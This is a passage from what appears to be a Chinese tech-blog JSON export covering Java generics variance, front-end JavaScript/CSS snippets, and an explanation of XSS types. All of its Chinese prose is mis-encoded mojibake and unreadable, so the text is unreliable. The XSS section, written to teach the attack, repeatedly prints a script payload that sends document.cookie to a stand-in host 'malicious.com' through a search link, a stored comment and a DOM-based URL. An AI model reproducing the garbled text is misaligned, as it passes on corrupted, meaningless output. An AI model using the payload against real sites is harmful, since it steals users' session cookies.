Number>` å°†ä¼šåŒ…å«ä»»æ„ç±»å‹çš„ `Number`ã€‚æ°æ°ç›¸åï¼Œé€šé…ç¬¦åªæŒ‡ä»£ä¸€ä¸ªæ˜ç¡®çš„ç±»å‹ã€‚æ‰€ä»¥è¢«èµ‹å€¼ç»™ `List<? extends Number>` çš„ `List` å¿…é¡»å¸¦æœ‰ä¸€ä¸ªå…·ä½“çš„ç±»å‹ï¼Œè‡³äºè¯¥ç±»å‹æ˜¯ `Integer` è¿˜æ˜¯ `Double` æ— å…³ç´§è¦ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¿è¿™ä¸ª list æ¥åšä»€ä¹ˆå‘¢ï¼Œæ¥çœ‹ä»¥ä¸‹ä¾‹å­\n\n```java\nList<? extends Number> numbers = new ArrayList<Integer>(); // covariance\nnumbers.add(new Integer(5)); // Not applicable\nnumbers.add(new Double(3.4)); // Not applicable\nnumbers.add(null); // works\n```\n\nè¿™ä¸æ˜¯ä»€ä¹ˆéƒ½åšä¸äº†å—ï¼Ÿå¹¶ä¸æ˜¯è¿™æ ·çš„ï¼Œå¦‚æœä¸çŸ¥é“ `numbers` é‡Œæ”¾ç€çš„å…·ä½“æ˜¯ä»€ä¹ˆç±»å‹ï¼Œæ˜¯æ²¡æœ‰åŠæ³•å®‰å…¨åœ°æ·»åŠ ä¸€ä¸ªå¯¹è±¡çš„ã€‚ä½†æ˜¯å¯ä»¥ä¿è¯çš„æ˜¯ï¼Œç¼–è¯‘å™¨ç¡®å®šä» `numbers` ä¸­å–å‡ºçš„å¯¹è±¡æ˜¯ `Number` ç±»å‹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ `Number n = numbers.get(0)` æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œåªä¸è¿‡åœ¨è¿™ä¸ªä¾‹å­ä¸­å¾—å‡ºçš„ç»“æœæ˜¯ `null`ã€‚**ç¼–è¯‘å™¨ä¸å…è®¸å…·æœ‰åå˜æ€§çš„å‚æ•°åŒ–ç±»å‹å¼•ç”¨è¿›è¡Œå†™å…¥æ“ä½œ ( null é™¤å¤–)ï¼Œå…è®¸è¯»å–æ“ä½œã€‚**\n\nè¿™é‡Œå›ç­”å‰é¢çš„é—®é¢˜ï¼Œä¸ºä»€ä¹ˆä¸èƒ½åˆ›å»ºæ³›å‹æ•°ç»„ã€‚åœ¨ Java ä¸­ï¼Œæ•°ç»„æ˜¯åå˜çš„ï¼Œä¹Ÿå³ `Number[] numbers = new Integer[5]` æ˜¯å¯ä»¥é€šè¿‡ç¼–è¯‘çš„ï¼Œå¦‚æœ `ArrayList<? extends Number>[] arr = new ArrayList<Integer>[5]` ä¹Ÿå¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Œå°±æœ‰å¯èƒ½äº§ç”Ÿ `arr[0] = new ArrayList<Double>()` çš„é”™è¯¯ä»£ç ï¼Œæ‰€ä»¥åˆ›å»ºæ³›å‹æ•°ç»„æ˜¯ä¸è¢«å…è®¸çš„ã€‚\n\n### super å’Œé€†å˜\n\nå’Œä½¿ç”¨ extends å…³é”®å­—äº§ç”Ÿçš„åå˜ç±»ä¼¼ï¼Œä½¿ç”¨ super å…³é”®å­—åˆ™ä½œç”¨äºé€†å˜ï¼Œè€ƒè™‘ä»¥ä¸‹ä»£ç \n\n```java\nArrayList<Number> numbers = new ArrayList<>();\nnumbers.add(new Double(3.5));\nnumbers.add(new Integer(5));\nnumbers.add(new Float(3.5f));\n\nArrayList<? super Integer> integers = numbers; // contravariance\nintegers.add(new Integer(3)); // works\nintegers.add(5); // autoboxing works [3.5, 5, 3.5, 3, 5]\n\nInteger n = integers.get(4); // cannot convert ? super Integer to Integer\nNumber n = integers.get(4); // cannot convert ? super Integer to Number\nObject n = integets.get(4);\n```\n\né€†å˜å­˜åœ¨äºç¬¬å…­è¡Œä»£ç ï¼Œä¹Ÿå°±æ˜¯ç±»å‹ä¸º `ArrayList<? super Integer>` çš„ integers æŒ‡å‘ç±»å‹ä¸º `ArrayList<Number>` çš„ `numbers`ï¼Œæ¥ä¸‹æ¥çš„æ“ä½œæˆåŠŸæ·»åŠ äº†ä¸¤ä¸ªæ•´æ•°ï¼ˆå…¶ä¸­ä¸€ä¸ª int ä¸º[è‡ªåŠ¨è£…ç®±](https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html)ï¼‰ï¼Œè€Œå¯¹äºè¯»å–æ“ä½œï¼Œåªèƒ½å–å‡º Object ç±»å‹çš„å¯¹è±¡ã€‚ç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå’Œåå˜çš„å±æ€§ç›¸åï¼š**å¯¹äºå…·æœ‰é€†å˜æ€§çš„å‚æ•°åŒ–ç±»å‹å¼•ç”¨ï¼Œåªèƒ½è¯»å–å‡º Object ç±»å‹çš„å¯¹è±¡ï¼Œå¯ä»¥å†™å…¥ç±»å‹ä¸ºé€šé…ç¬¦ä¸‹ç•Œçš„å¯¹è±¡ã€‚**\n\n### PECS åŸåˆ™\n\nå¯¹äºä»€ä¹ˆæ—¶å€™ç”¨ `extends` æˆ–è€… `super` çš„é—®é¢˜ï¼ŒEffective Java çš„ä½œè€…æå‡ºäº† PECS åŸåˆ™ï¼Œä¹Ÿå°±æ˜¯ **Producer Extends Consumer Super**ã€‚[^Effective-Java]ä¸‹é¢æˆ‘ä»¬é€šè¿‡åŸæ–‡å…·ä½“çš„ä»£ç æ¥è§£é‡Šï¼Œ\n\n#### Producer Extends\n\nè€ƒè™‘ Java é›†åˆä¸­çš„ `Stack<E>`ï¼Œå‡è®¾æˆ‘ä»¬æƒ³ç»™å®ƒæ·»åŠ ä¸€ä¸ª `pushAll` æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥å—ä¸€ç»„å…ƒç´ å¹¶æŠŠä»–ä»¬æ”¾å…¥æ ˆé¡¶ï¼Œæˆ‘ä»¬é©¬ä¸Šå†™å‡ºå¦‚ä¸‹ä»£ç ã€‚\n\n```java\npublic void pushAll(Iterable<E> src) {\n  for (E e: src) {\n    push(e);\n  }\n}\n```\n\nä»¥ä¸Šä»£ç å¯ä»¥æ­£ç¡®ç¼–è¯‘ï¼Œä½†æ˜¯å®ƒä»…ä»…æ¨å…¥å’Œæ ˆç›¸åŒç±»å‹çš„å…ƒç´ ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª `Number` æ ˆï¼Œæƒ³æ”¾å…¥ `Integer` å…ƒç´ ï¼Œå¦‚ä»¥ä¸‹ä»£ç æ‰€ç¤º\n\n```java\nStack<Number> numbers = new Stack<Number>();\nIterable<Integer> integers = ...;\nnumbers.pushAll(integers); // not applicable\n```\n\nä»£ç ä¼šæŠ¥é”™ï¼Œå› ä¸º `Iterable<Integer>` å’Œ `Iterable<Number>` æ²¡æœ‰å…³ç³»ï¼Œé€šè¿‡é€šé…ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–¹æ³•å¤´ä¿®æ”¹ä¸ºå¦‚ä¸‹ä»£ç  `public void pushAll(Iterable<? extends E> src)`  å°±å¯ä»¥äº†ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé€šé…ç¬¦å‚æ•°åŒ–çš„æ³›å‹å……å½“ E ç±»å‹çš„ç”Ÿäº§è€…çš„è§’è‰²ï¼ˆè¯»å–è‡ªèº«å…ƒç´ åˆ° Stack ï¼‰ã€‚\n\n#### Consumer Super\n\nåŒæ ·çš„å‡è®¾æˆ‘ä»¬æƒ³ç»™ `Stack<E>` æ·»åŠ ä¸€ä¸ª `popAll` æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªé›†åˆï¼Œæ‹¿å‡ºè¯¥æ ˆæ‰€æœ‰çš„å…ƒç´ å¹¶æ·»åŠ åˆ°å…¶ä¸­ã€‚\n\n```java\npublic void popAll(Collection<E> dst) {\n  while(!isEmpty()) {\n    dst.add(pop());\n  }\n}\n```\n\nåŒæ ·çš„é”™è¯¯ä¼šæŠ¥å‡ºå½“ä½ æƒ³æŠŠä¸€ä¸ª `Stack<Number>` åœ°å…ƒç´ æ”¾è¿› `Collection<Object>` ï¼Œå°†æ–¹æ³•ç­¾åä¿®æ”¹ä¸º `public void popAll(Collection<? super E> dst)` å³å¯ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé€šé…ç¬¦å‚æ•°åŒ–çš„æ³›å‹å……å½“ E ç±»å‹æ¶ˆè´¹è€…çš„è§’è‰²ï¼ˆå†™å…¥ Stack å…ƒç´ åˆ°è‡ªèº«ï¼‰ã€‚\n\n### ç»“è®º\n\nå…¶å®ç†è§£ä»¥ä¸Šå†…å®¹å¹¶ä¸éš¾ï¼Œæœ€å¤§çš„é—®é¢˜è¿˜æ˜¯åœ¨äºå¯¹é€šé…ç¬¦çš„è®¤è¯†ä¸Šã€‚\n\n> æˆ‘ä»¬éƒ½çŸ¥é“ `?` æˆ– `? extends Object` ä»£è¡¨ä¸€ä¸ªæœªçŸ¥ç±»å‹ï¼Œè¡¨é¢çœ‹ä¸Šå»å®ƒä»£è¡¨ä»€ä¹ˆç±»å‹éƒ½å¯ä»¥ï¼Œç„¶åä½ å¯èƒ½ä¼šæŠŠå®ƒå½“ä½œä»»æ„ç±»å‹äº†ã€‚äºæ˜¯ä½ ä¼šæŠŠ `<?>` è¯»ä½œå¯æŒæœ‰ä»»æ„ç±»å‹çš„å‚æ•°åŒ–ç±»å‹ã€‚åŒç†ï¼ŒæŠŠ `<? extends T>` è¯»ä½œå¯æŒæœ‰ä»»æ„ `T` æˆ–å…¶å­ç±»å‹çš„å‚æ•°åŒ–ç±»å‹ï¼ŒæŠŠ `<? super T>` è¯»ä½œå¯æŒæœ‰ä»»æ„ `T` æˆ–å…¶çˆ¶ç±»å‹çš„å‚æ•°åŒ–ç±»å‹ã€‚[^JavaSEæ³›å‹è¿›é˜¶]\n\nè€Œå®é™…ä¸Šé€šè¿‡æœ¬èŠ‚ä»£ç çš„ä¾‹å­ï¼Œ`?` å¹¶ä¸æ˜¯ä»£è¡¨ä»»æ„ç±»å‹ï¼Œå®ƒä»…ä»…ä»£è¡¨**ä¸€ä¸ªæœªçŸ¥ç±»å‹ï¼Œä¸€ä¸ªä»€ä¹ˆç±»å‹éƒ½å¯ä»¥ï¼Œä½†æ˜¯å…·ä½“ä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„ç±»å‹**ï¼Œæ‰€ä»¥åº”è¯¥æŠŠ `List<?>` è¯»ä½œæŒæœ‰æœªçŸ¥ç±»å‹çš„ `List`ï¼Œ**åº”è¯¥æŠŠä½¿ç”¨é€šé…ç¬¦è¿›è¡Œå‚æ•°åŒ–çš„ç±»å‹è¯»ä½œä¸€ä¸ªå¯æŒæœ‰æŸç§åŒ…å«äºæŒ‡å®šç±»å‹åŒºé—´ä¹‹å†…çš„æœªçŸ¥ç±»å‹çš„å‚æ•°åŒ–ç±»å‹**ã€‚\n\nç†æ¸…ä»¥ä¸Šè§£é‡ŠååŠ ä¸Šå‰é¢çš„ä¾‹å­ï¼Œå°ç»“å¦‚ä¸‹ï¼š\n\n- **é€šé…ç¬¦çš„ä½œç”¨å°±æ˜¯ç»™æ³›å‹å¢åŠ å˜æ€§**\n\n- **é€šé…ç¬¦ä¸Šç•Œå¢åŠ åå˜æ€§ï¼Œé€šé…ç¬¦ä¸‹ç•Œå¢åŠ é€†å˜æ€§**\n- **åå˜æ€§æ³›å‹æ˜¯â€œåªè¯»â€çš„ï¼Œé€†å˜æ€§æ³›å‹æ˜¯â€œåªå†™â€çš„**\n- **Producer Extends Consumer Super**\n\n## ä¸€ä¸ªæœ‰è¶£çš„ç»†èŠ‚\n\nä¸ºä»€ä¹ˆ `Map<K, V>` ä¸­ `get` æ–¹æ³•æ²¡æœ‰å®Œå…¨æ³›å‹åŒ–ï¼Œè€Œ `put` æ˜¯å®Œå…¨æ³›å‹åŒ–çš„ã€‚[^æ·±å…¥Javaæ³›å‹]\n\n```java\nV put(K key, V value);\nV get(Object key);\n```\n\nå› ä¸ºä½ åœ¨**æŸ¥æ‰¾çš„ entry çš„ key æ²¡å¿…è¦å’Œä½ ä¼ å…¥ get æ–¹æ³•ä¸­çš„å‚æ•°ç±»å‹ä¸€è‡´**ï¼Œæ–¹æ³•çš„å…·ä½“å®ç°åªè¦æ±‚äº†ä»–ä»¬ç›¸ç­‰ã€‚åœ¨ Java ä¸­ï¼Œæœ‰å¾ˆå¤šæƒ…å†µä¸‹ä¸¤ä¸ªå¯¹è±¡ç±»å‹ä¸åŒï¼Œä½†æ˜¯ `equals` æ–¹æ³•ä¾ç„¶è¿”å› `true`ã€‚ä¾‹å¦‚ï¼Œ`List.equals()` çš„å®ç°è¯´ï¼Œä¸¤ä¸ªåˆ—è¡¨éƒ½ä¸º `List` ç±»å‹ï¼Œå¹¶ä¸”å…·æœ‰ç›¸åŒçš„å†…å®¹ï¼Œå³ä½¿å®ƒä»¬æ˜¯ `List` çš„ä¸åŒå®ç°ï¼Œä¹Ÿæ˜¯ç›¸ç­‰çš„ã€‚å›åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå¯èƒ½æœ‰ä¸€ä¸ª `Map<ArrayList, Something>`ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ `LinkedList` ä½œä¸ºå‚æ•°è°ƒç”¨ `get()`ï¼Œå¹¶ä¸”å®ƒåº”è¯¥æ£€ç´¢å…·æœ‰ç›¸åŒå†…å®¹çš„åˆ—è¡¨çš„é”®ã€‚ å¦‚æœ `get()` æ¥å—æ³›å‹å‚æ•°åˆ™ä¼šé™åˆ¶äº†å®ƒçš„å‚æ•°ç±»å‹ï¼Œé‚£å°±æ²¡åŠæ³•æ£€ç´¢å‡ºæ¥ï¼Œæ˜¾ç„¶è¿™æ˜¯ä¸å¯¹çš„ã€‚[^whynotgeneric]\n\n## ç­”æ¡ˆ\n\n1.  \\#1 \\#4 \\#5 \\#6 \\#8 \\#9 \\#10 æ— æ³•ç¼–è¯‘\n\n2. \\#3 æ˜¯æ­£ç¡®ç­¾å\n\n\n\n\n\n[^Thinking-in-Java]: Thinking in Java\n[^JavaSEæ³›å‹è¿›é˜¶]: [JavaSE å­¦ä¹ ç¬”è®° - æ³›å‹è¿›é˜¶](https://extremegtr.github.io/2016/05/30/JavaSE-study-advanced-generics/)\n[^Effective-Java]: Effective Java\n[^whynotgeneric]: [stackoverflow](https://stackoverflow.com/questions/857420/what-are-the-reasons-why-map-getobject-key-is-not-fully-generic)\n[^æ·±å…¥Javaæ³›å‹]: [æ·±å…¥ Java æ³›å‹](http://zuoqy.com/2015/05/19/java-generic/#refs)","tags":["Java","æ³›å‹"]},{"title":"å‰ç«¯å°æŠ€å·§","url":"/2020/06/28/front-end-tips/","content":"\n\n::: info\n\næœ€è¿‘æ›´æ–° 2020/08/03\n\n:::\n\n## JavaScript\n\n### å…è®¸å¤šä¸ª onload äº‹ä»¶\n\n```javascript\nvar addLoadEvent = function (func) {\n  var oldonload = window.onload\n  if (typeof window.onload != 'function') {\n    window.onload = func\n  } else {\n    window.onload = function () {\n      oldonload()\n      func()\n    }\n  }\n}\n```\n\n### groupBy ï½œ aggregate\n\n```javascript\nvar groupBy = function(xs, key) {\n  return xs.reduce(function(rv, x) {\n    (rv[x[key]] = rv[x[key]] || []).push(x);\n    return rv;\n  }, {});\n};\n\nvar a = [\n  {a: 1, b: 2, c: 3},\n  {a: 1, b: 3, c: 4},\n  {a: 2, b: 9, c: 9},\n  {a: 2, b: 9, c: 8}\n];\n\ngroupBy(a, 'a');\n\n// {\n//   '1': [ { a: 1, b: 2, c: 3 }, { a: 1, b: 3, c: 4 } ],\n//   '2': [ { a: 2, b: 9, c: 9 }, { a: 2, b: 9, c: 8 } ]\n// }\n```\n\n### base64<=>blob\n\n```javascript\nbase64toBlob(dataURI) {\n    // convert base64/URLEncoded data component to raw binary data held in a string\n    let byteString;\n    if (dataURI.split(',')[0].indexOf('base64') >= 0) {\n        byteString = atob(dataURI.split(',')[1]);\n    } else {\n        byteString = unescape(dataURI.split(',')[1]);\n    }\n    // separate out the mime component\n    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];\n    // write the bytes of the string to a typed array\n    const ia = new Uint8Array(byteString.length);\n    for (let i = 0; i < byteString.length; i++) {\n        ia[i] = byteString.charCodeAt(i);\n    }\n    return new Blob([ ia ], {type : mimeString});\n}\n\nblobToB64(blob) {\n    return new Promise((resolve, reject) => {\n        const reader = new FileReader();\n        reader.readAsDataURL(blob);\n        reader.onload = () => {\n            resolve(reader.result);\n        };\n    });\n}\n```\n\n### Screen Scroll Event\n\n```javascript\nvar prevScrollpos = window.pageYOffset;\nwindow.onscroll = function() {\n  var currentScrollPos = window.pageYOffset;\n  if (prevScrollpos > currentScrollPos) {\n    // screen up\n    ...\n  } else {\n    // screen down\n    ...\n  }\n  prevScrollpos = currentScrollPos;\n}\n\n// å¦‚æœæ˜¯å…ƒç´ çš„å†…æ»šåŠ¨åˆ™ä¸ºæŠŠ window æ¢æˆè¯¥å…ƒç´ ï¼ŒpageYOffset/pageXOffset æ¢ä¸º scrollTop/scrollLeft\n```\n\n\n\n## CSS\n\n### vertical centering å¥‡æ·«å·§æŠ€\n\n```css\n.parent {\n    display: inline-block;\n    width: 300px;\n    height: 300px;\n    font-size: 0;\n    background: #80848f;\n    text-align: center;\n}\n.parent:before {\n    display: inline-block;\n    width: 20px;\n    height: 100%;\n    content: '';\n    background: #ff9900;\n    vertical-align: middle;\n}\n.child {\n    display: inline-block;\n    width: 50px;\n    height: 50px;\n    background: #19be6b;\n    vertical-align: middle;\n```\n\n### æ ‡é¢˜ç¼–å·\n\n```css\nbody {counter-reset: h2}\n  h2 {counter-reset: h3}\n  h3 {counter-reset: h4}\n  h4 {counter-reset: h5}\n  h5 {counter-reset: h6}\n  h2:before {counter-increment: h2; content: counter(h2) \". \"}\n  h3:before {counter-increment: h3; content: counter(h2) \".\" counter(h3) \". \"}\n  h4:before {counter-increment: h4; content: counter(h2) \".\" counter(h3) \".\" counter(h4) \". \"}\n  h5:before {counter-increment: h5; content: counter(h2) \".\" counter(h3) \".\" counter(h4) \".\" counter(h5) \". \"}\n  h6:before {counter-increment: h6; content: counter(h2) \".\" counter(h3) \".\" counter(h4) \".\" counter(h5) \".\" counter(h6) \". \"}\n  h2.nocount:before, h3.nocount:before, h4.nocount:before, h5.nocount:before, h6.nocount:before { content: \"\"; counter-increment: none }\n```\n\n### æ‚¬åœä¸‹åˆ’çº¿\n\n```css\na {\n    text-decoration: none;\n}\n.link--underline {\n    position: relative;\n}\n.link--underline:before {\n    content: \"\";\n    position: absolute;\n    width: 100%;\n    height: 2px;\n    bottom: 0;\n    left: 0;\n    background-color: #233333;\n    visibility: hidden;\n    transform: scaleX(0);\n    transition: all .2s ease-in-out;\n}\n.link--underline:hover:before {\n    visibility: visible;\n    transform: scaleX(1);\n}\n```\n\n### checkbox è‡ªå®šä¹‰æ ·å¼\n\n```css\n/* Base for label styling */\n[type=\"checkbox\"]:not(:checked),\n[type=\"checkbox\"]:checked {\n  position: absolute;\n  left: -9999px;\n}\n[type=\"checkbox\"]:not(:checked) + label,\n[type=\"checkbox\"]:checked + label {\n  position: relative;\n  padding-left: 1.95em;\n  cursor: pointer;\n}\n\n/* checkbox aspect */\n[type=\"checkbox\"]:not(:checked) + label:before,\n[type=\"checkbox\"]:checked + label:before {\n  content: '';\n  position: absolute;\n  left: 0; top: 0;\n  width: 1.25em; height: 1.25em;\n  border: 2px solid #ccc;\n  background: #fff;\n  border-radius: 4px;\n  box-shadow: inset 0 1px 3px rgba(0,0,0,.1);\n}\n/* checked mark aspect */\n[type=\"checkbox\"]:not(:checked) + label:after,\n[type=\"checkbox\"]:checked + label:after {\n  content: '\\2713\\0020';\n  position: absolute;\n  top: .15em; left: .22em;\n  font-size: 1.3em;\n  line-height: 0.8;\n  color: #09ad7e;\n  transition: all .2s;\n  font-family: 'Lucida Sans Unicode', 'Arial Unicode MS', Arial;\n}\n/* checked mark aspect changes */\n[type=\"checkbox\"]:not(:checked) + label:after {\n  opacity: 0;\n  transform: scale(0);\n}\n[type=\"checkbox\"]:checked + label:after {\n  opacity: 1;\n  transform: scale(1);\n}\n/* disabled checkbox */\n[type=\"checkbox\"]:disabled:not(:checked) + label:before,\n[type=\"checkbox\"]:disabled:checked + label:before {\n  box-shadow: none;\n  border-color: #bbb;\n  background-color: #ddd;\n}\n[type=\"checkbox\"]:disabled:checked + label:after {\n  color: #999;\n}\n[type=\"checkbox\"]:disabled + label {\n  color: #aaa;\n}\n/* accessibility */\n[type=\"checkbox\"]:checked:focus + label:before,\n[type=\"checkbox\"]:not(:checked):focus + label:before {\n  border: 2px dotted blue;\n}\n\n/* hover style just for information */\nlabel:hover:before {\n  border: 2px solid #4778d9!important;\n}\n```\n\n","tags":["JavaScript","tips","CSS"]},{"title":"åå°„å‹ XSS ç–‘é—®åŠå»¶ä¼¸ (CSRF)","url":"/2019/04/07/XSS-discussion/","content":"\n\n## æœ‰å…³åå°„å‹ XSS çš„ç–‘é—®\n\nå­¦ä¹  XSS (Cross-Site Scriptingï¼Œè·¨ç«™è„šæœ¬æ”»å‡») çš„æ—¶å€™å¯ä»¥äº†è§£åˆ° XSS åˆ†ä¸ºä¸‰ç§ï¼šæŒä¹…å‹ (type-2)ï¼Œåå°„å‹ (type-1) å’ŒåŸºäº DOM å‹ (type-0) ã€‚  \nåœ¨çœ‹åå°„å‹çš„æ—¶å€™ï¼Œæ€»ç»“ä¸€ä¸‹å¤§å¤šæ•°å¸–å­ç»™å‡ºçš„è§£é‡Šï¼š**æ¶æ„è„šæœ¬æœ¬èº«æ˜¯ä½œä¸ºè¯·æ±‚å‚æ•°å‘é€åˆ°ç«™ç‚¹é¡µé¢å­˜åœ¨æ¼æ´çš„åœ°æ–¹ï¼ˆé€šå¸¸æ˜¯æœç´¢æ¡†ï¼‰ï¼Œç„¶åè„šæœ¬åå°„ï¼ˆå‡ºç°ï¼‰åœ¨æ–°æ¸²æŸ“ï¼ˆæˆ–è€…éƒ¨åˆ†åˆ·æ–°ï¼‰çš„é¡µé¢å¹¶æ‰§è¡Œã€‚**\n\næ¥ä¸‹æ¥çœ‹ä¾‹å­ï¼š  \nç”¨æˆ·åœ¨ä¸€ä¸ªä¸é˜²èŒƒ XSS çš„ç½‘ç«™ä¸­æœç´¢å†…å®¹ï¼Œå…³é”®å­—ä¸º XXXï¼Œå¦‚æœç½‘ç«™å†…åŒ…å« XXXçš„å†…å®¹ï¼Œé‚£ä¹ˆè¯¥å†…å®¹å°±ä¼šè¢«å±•ç¤ºå‡ºæ¥ï¼Œå¦‚æœç½‘ç«™ä¸­ä¸åŒ…å«ç›¸å…³ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šæç¤º XXX ç›¸å…³å†…å®¹ä¸å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯ï¼Œç”¨æˆ·çš„æœç´¢å†…å®¹æœ€ç»ˆéƒ½ä¼šä»¥æŸç§æ–¹å¼åå°„åˆ°æœç´¢ç»“æœä¸­ã€‚å¦‚æœæœç´¢å†…å®¹ä¸ºï¼š`<script>alert(1)</script>`ï¼Œé‚£ä¹ˆé¡µé¢å°±ä¼šæ‰§è¡Œè¿™æ®µ JavaScript ä»£ç ï¼Œä¹Ÿå³è¯¥ç½‘ç«™å­˜åœ¨ XSS æ¼æ´ã€‚\n\n**é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼š** ä½œä¸ºä¸æ‡‚ JavaScript çš„ç”¨æˆ·ï¼Œæ˜¯ä¸å¯èƒ½è‡ªå·±åœ¨æœç´¢æ¡†ä¸­è¾“å…¥æ¶æ„è„šæœ¬æ”»å‡»è‡ªå·±çš„ã€‚å¤§éƒ¨åˆ†ç½‘ä¸Šçš„å¸–å­ç»™å‡ºçš„ä¾‹å­åˆ°ä»¥ä¸Šå†…å®¹ä¸ºæ­¢ï¼Œè§£é‡Šäº†ä»€ä¹ˆæ˜¯åå°„å‹ XSSï¼Œä½†æ˜¯å´æ²¡æœ‰è¯´æ˜å¦‚ä½•è¿›è¡Œæ”»å‡»ã€‚æˆ‘çŒœæƒ³æ˜¯é€šè¿‡ä¾‹å¦‚ `www.example.com?search=<script>window.location='http://malicious.com/?data=' + document.cookie</script>` è¿™æ ·çš„æ¶æ„é“¾æ¥åšåˆ°çš„ï¼Œç»å†ä¸€ç•ªæœå¯»æ±‚è¯ï¼Œè¿˜æ˜¯åœ¨ä¸€äº›åšå®¢ä¸­æœ‰æåŠçš„ç¡®æ˜¯è¿™æ ·åšçš„ï¼ˆå…·ä½“æŸ¥çœ‹æ–‡æœ«å‚è€ƒï¼‰ã€‚\n\n## XSS å°ç»“\n\nä¸Šæ–‡æåˆ°ï¼ŒXSS å¯ä»¥åˆ†ä¸ºä¸‰ç§ï¼ŒæŒä¹…å‹ï¼ˆPersistentï¼‰ï¼Œåå°„å‹ï¼ˆReflectedï¼‰ï¼Œå’ŒåŸºäº DOM å‹ï¼ˆDOM-Basedï¼‰ã€‚ä»”ç»†æ¥è®²ä¸€ä¸‹è¿™ä¸‰è€…å§ã€‚  \n\n### æŒä¹…å‹\n\n#### å®šä¹‰\n\n**æ¶æ„è„šæœ¬è¢«æ”»å‡»è€…ä¸Šä¼ åˆ°åˆæ³•çš„æœåŠ¡å™¨ä¸­ï¼Œå¹¶åœ¨å¸¸è§„çš„é¡µé¢æµè§ˆè¿‡ç¨‹ä¸­è¿”å›ç»™æ™®é€šç”¨æˆ·å¹¶è¢«æ‰§è¡Œã€‚**\n\n#### ä¾‹å­\n\næ”»å‡»è€…åœ¨ä¸€ä¸ªåšå®¢ç½‘ç«™ä¸­çš„ä¸€ç¯‡åšå®¢ä¸‹è¯„è®º `<script>window.location='http://malicious.com/?data=' + document.cookie</script>`ï¼Œæ¶æ„ä»£ç å°±ä¼šåœ¨æ‰€æœ‰è®¿é—®è¿™ç¯‡åšå®¢è¯„è®ºçš„ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚\n\n### åå°„å‹\n\n#### å®šä¹‰\n\nä¸Šæ–‡æè¿‡äº†ï¼Œè¿™é‡Œé‡å¤ä¸€éï¼š**æ¶æ„è„šæœ¬æœ¬èº«æ˜¯ä½œä¸ºè¯·æ±‚å‚æ•°å‘é€åˆ°ç«™ç‚¹é¡µé¢å­˜åœ¨æ¼æ´çš„åœ°æ–¹ï¼ˆé€šå¸¸æ˜¯æœç´¢æ¡†ï¼‰ï¼Œç„¶åè„šæœ¬åå°„ï¼ˆå‡ºç°ï¼‰åœ¨æ–°æ¸²æŸ“ï¼ˆæˆ–è€…éƒ¨åˆ†åˆ·æ–°ï¼‰çš„é¡µé¢å¹¶æ‰§è¡Œã€‚**\n\n#### ä¾‹å­\n\nä¾‹å­å°±ä¸é‡å¤ï¼Œå¼€å¤´ç»™å‡ºäº†å…·ä½“çš„ä¾‹å­ã€‚ä¸è¿‡æŸ¥é˜…çš„æ–‡ç« ä¸­æœ‰å¼ å›¾å¾ˆå½¢è±¡ï¼Œè¿™é‡Œå¼•ç”¨ä¸€ä¸‹  \n![åå°„å‹ XSS å›¾ç‰‡è¯´æ˜](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627154124)\n\n### åŸºäº DOM å‹\n\n#### å®šä¹‰\n\nåŸºäº DOM å‹ XSS å…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šçš„åå°„å‹ XSSï¼Œåå°„å‹ XSS çš„æ‰§è¡Œè¿‡ç¨‹ç»è¿‡äº†æœåŠ¡å™¨ç«¯ï¼ˆä¸Šé¢çš„ä¾‹å­ä¸­å‘æœåŠ¡å™¨å‘äº†è¯·æ±‚ï¼‰ï¼Œè€ŒåŸºäº DOM çš„ XSS æ²¡æœ‰ç»è¿‡æœåŠ¡å™¨ç«¯ï¼ˆæ¶æ„ä»£ç æ²¡æœ‰æµç»æœåŠ¡ç«¯ï¼‰ï¼Œç›´æ¥é€šè¿‡ JavaScriptï¼ˆå¹¶éæ”»å‡»è€…å†™çš„æ¶æ„è„šæœ¬ï¼Œè€Œæ˜¯æ¥è‡ªæœåŠ¡å™¨çš„ DOM æ“ä½œè„šæœ¬ï¼‰å°†æ•°æ®è¾“å‡ºåˆ° HTML é¡µé¢ä¸­ã€‚\n\n#### ä¾‹å­\n\nå‡è®¾å¦‚ä¸‹è¡¨å•æ˜¯è®©ç”¨æˆ·é€‰æ‹©ä»–çš„é¦–é€‰è¯­è¨€ï¼Œé»˜è®¤é€‰é¡¹ä½œä¸ºå‚æ•°æä¾›åœ¨äº† \"default\" å‚æ•°ä¸­ã€‚  \n\n```html\n<span>Select your language:</span>\n<select><script>\n  document.write('<OPTION value=1>' + document.location.href.substring( document.location.href.indexOf('efault=') + 8)+'</OPTION>');\n  document.write('<OPTION value=2>English</OPTION>');\n</script></select>\n```\n\nä½¿ç”¨ä¸€ä¸‹ URL è°ƒç”¨è¯¥é¡µé¢  \n\n```html\nhttp://www.some.site/page.html?default=French\n```\n\nå¯ä»¥é€šè¿‡å‘å—å®³è€…å‘é€ä»¥ä¸‹ URL æ¥å®ŒæˆåŸºäº DOM çš„ XSS æ”»å‡»\n\n```html\nhttp://www.some.site/page.html?default=<script>window.location='http://malicious.com/?data=' + document.cookie</script>\n```\n\n### åå°„å‹å’ŒæŒä¹…å‹åŒºåˆ«\n\næœ€å¤§çš„åŒºåˆ«å°±æ˜¯ XSS æ¶æ„ä»£ç 